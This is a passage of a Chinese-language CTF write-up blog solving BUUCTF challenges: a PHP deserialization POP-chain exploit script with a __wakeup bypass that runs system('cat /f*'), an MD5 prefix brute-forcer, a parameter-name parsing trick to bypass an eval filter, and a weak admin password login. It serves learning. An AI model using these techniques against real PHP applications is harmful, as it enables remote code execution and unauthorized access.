src="/2024/03/20/buuctf/buu/image-20240322163824019.png" class="" title="image-20240322163824019"><h2 id="DASCTF-X-GFCTF-2022十月挑战赛！-EasyPOP"><a href="#DASCTF-X-GFCTF-2022十月挑战赛！-EasyPOP" class="headerlink" title="[DASCTF X GFCTF 2022十月挑战赛！]EasyPOP"></a>[DASCTF X GFCTF 2022十月挑战赛！]EasyPOP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ctf</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ctf = <span class="variable">$ctf</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf . <span class="string">&quot;: Duration of practice: &quot;</span> . <span class="variable language_">$this</span>-&gt;time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password == <span class="variable language_">$this</span>-&gt;name) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hint;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;jay&quot;</span>) &#123;</span><br><span class="line">            secret_code::<span class="title function_ invoke__">secret</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is our code&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPassword</span>(<span class="params"><span class="variable">$password</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">secret</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="string">&quot;hint.php&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setPassword</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="string">&quot;Ctfer&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这里我顺着分析吧，感觉倒着分析比倒着分析要简单</p><p>:::warning no-icon</p><p><code>__invoke()</code>触发条件是：当尝试以调用函数的方式调用其所在的对象时</p><p><code>__get()</code>触发条件是：当读取一个对象中不可访问或者不存在的属性时</p><p><code>__call()</code>触发条件是：当调用一个对象不存在的属性或者不可访问的方法时</p><p><code>__wakeup()</code>触发条件是：当所在的对象要被反序列化时</p><p><code>__sleep()</code>触发条件是：当所在的对象要被序列化时</p><p>:::</p><p>首先，sorry类有<code>__destruct()</code>，入口在这里</p><p>由于题目事先设置了一个随机密码，可以用取地址&amp;绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setPassword</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()));</span><br></pre></td></tr></table></figure><p>然后hint是echo出来的，恰好show类中有<code>__toString()</code>，就顺着它走了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调用了<code>show()</code>，secret_code类有这个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>==其实show类也有，只不过他没啥用撒:happy:==</p><p>但是其他类中没有secret这个变量，有也只是function，猜测这个时候就是要用到<code>__get()</code>了，于是调到sorry类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里把$name当成函数调用了，那就是<code>__invoke()</code>了，跳转到fine类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>注意到这里有<code>__wakeup()</code>，所以在序列化之后还要绕过它，改个参数就好了，比如对象个数啥的</p><p>pop链如下：</p><p>sorry::destruct() -&gt; show::toString()-&gt;secret_show::show()-&gt;sorry::get()-&gt;fine::invoke()</p><p>脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = &amp;<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key = <span class="keyword">new</span> <span class="title function_ invoke__">fine</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;cat /f*&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;ctf = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;hint = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;fine\&quot;:2&quot;</span>,<span class="string">&quot;fine\&quot;:3&quot;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure><p>:::warning</p><p>这里不能直接用序列化后的字符串是因为在php中，属性为protected和private的变量在序列化之后经过url编码时会被加上不可见字符，可以去搜一搜，网上挺多文章的。不过养成习惯，还是最好都用url编码后的字符串交上去</p><p>:::</p><h2 id="NewStarCTF-2023-公开赛道-R-C-E"><a href="#NewStarCTF-2023-公开赛道-R-C-E" class="headerlink" title="[NewStarCTF 2023 公开赛道]R!C!E!"></a>[NewStarCTF 2023 公开赛道]R!C!E!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>代码逻辑很简单，非法传参和md5碰撞罢了</p><p>MD5这里可以直接爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">str1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">500000</span>):</span><br><span class="line">        <span class="keyword">if</span> (hashlib.md5(<span class="built_in">str</span>(i).encode(<span class="string">&quot;UTF-8&quot;</span>)).hexdigest())[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&quot;c4d038&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">decode(<span class="string">&quot;c4d038&quot;</span>)</span><br></pre></td></tr></table></figure><p>爆破出来是114514</p><h3 id="非法传参"><a href="#非法传参" class="headerlink" title="非法传参"></a>非法传参</h3><p>在php版本小于8时，php处理名字带有<code>.</code>、<code>空格</code>、<code>[</code>、<code>]</code>等符号的变量名时，会将第一个符号转化为下划线<code>_</code>，但是不会改变后续的符号</p><p>php版本大于8时，php会将所有符号转化为下划线<code>_</code></p><p>这里我们并不知道php版本，但是根据变量名可以猜测php版本为7.x，因为我们目标的变量名是<code>e_v.a.l</code>，如果php版本大于8，那么在转换的时候会将变量名的符号全部转换为<code>_</code>，这样会导致变量名不一致而导致传参失败</p><p>这里在POST时传名字e[.v.a.l</p><img src="/2024/03/20/buuctf/buu/image-20240325185300017.png" class="" title="image-20240325185300017"><p>这里的waf相当于一个纸老虎，执行命令tac /f*即可（不确定的可以用find函数）</p><img src="/2024/03/20/buuctf/buu/image-20240325185401554.png" class="" title="image-20240325185401554"><p>用find查找flag结果如下：</p><img src="/2024/03/20/buuctf/buu/image-20240325185500177.png" class="" title="image-20240325185500177"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/sys/devices/platform/serial8250/tty/ttyS2/flags </span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS0/flags </span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS3/flags </span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS1/flags </span><br><span class="line">/sys/devices/virtio-mmio-cmdline/virtio-mmio.3/virtio3/net/eth0/flags </span><br><span class="line">/sys/devices/virtual/net/lo/flags </span><br><span class="line">/usr/include/linux/flat.h </span><br><span class="line">/flag</span><br></pre></td></tr></table></figure><h2 id="NewStarCTF-2023-公开赛道-EasyLogin"><a href="#NewStarCTF-2023-公开赛道-EasyLogin" class="headerlink" title="[NewStarCTF 2023 公开赛道]EasyLogin"></a>[NewStarCTF 2023 公开赛道]EasyLogin</h2><p>打开登录界面，发现并没有注入点，正常注册登录就行</p><img src="/2024/03/20/buuctf/buu/image-20240325185834612.png" class="" title="image-20240325185834612"><p>这里出题人做了一个shell，开始时我们进入的是一个聊天程序，你发什么它回你什么</p><p>Ctrl+D退出程序</p><p>经过搜索发现并没有什么有用的</p><img src="/2024/03/20/buuctf/buu/image-20240325190108100.png" class="" title="image-20240325190108100"><p>并且bin中就这几个命令，且根目录只有bin和home</p><p>有点一筹莫展了</p><p>抓个包看看登录界面</p><p>在发包时注意到有一个/passport包</p><img src="/2024/03/20/buuctf/buu/image-20240325190521852.png" class="" title="image-20240325190521852"><p>里面似乎有flag，但我们看不到</p><p>可能是权限问题？也只能猜猜</p><p>之前在注册时发现admin被注册了，试试能不能用弱密码</p><p>发现能成功，密码是000000</p><p>再重新抓包</p><p>302跳转，得到flag</p><img src="/2024/03/20/buuctf/buu/image-20240325190833774.png" class="" title="image-20240325190833774"><h2 id="NewStarCTF-2023-公开赛道-Begin-of-HTTP"><a href="#NewStarCTF-2023-公开赛道-Begin-of-HTTP" class="headerlink" title="[NewStarCTF 2023 公开赛道]Begin of HTTP"></a>[NewStarCTF 2023 公开赛道]Begin of HTTP</h2><p>这里就不多说了，http头的有关描述在<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept">官方档案</a>里，放操作</p><img src="/2024/03/20/buuctf/buu/image-20240325191241817.png" class="" title="image-20240325191241817"><p>secret看源代码</p><img src="/2024/03/20/buuctf/buu/image-20240325191403306.png" class="" title="image-20240325191403306"><img src="/2024/03/20/buuctf/buu/image-20240325191613796.png" class="" title="image-20240325191613796"><img src="/2024/03/20/buuctf/buu/image-20240325191835373.png" class="" title="image-20240325191835373"><img src="/2024/03/20/buuctf/buu/image-20240325191935035.png" class="" title="image-20240325191935035"><img src="/2024/03/20/buuctf/buu/image-20240325192411163.png" class="" title="image-20240325192411163"><h2 id="NewStarCTF-2023-公开赛道-Begin-of-Upload"><a href="#NewStarCTF-2023-公开赛道-Begin-of-Upload" class="headerlink" title="[NewStarCTF 2023 公开赛道]Begin of Upload"></a>[NewStarCTF 